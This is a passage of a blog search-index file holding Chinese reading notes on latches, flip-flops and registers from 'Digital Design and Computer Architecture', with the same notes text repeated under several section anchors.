使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#sr-latch"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#d-latch"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#d-flip-flop"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#register"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#enabled-flip-flop"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#resettable-flip-flop"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 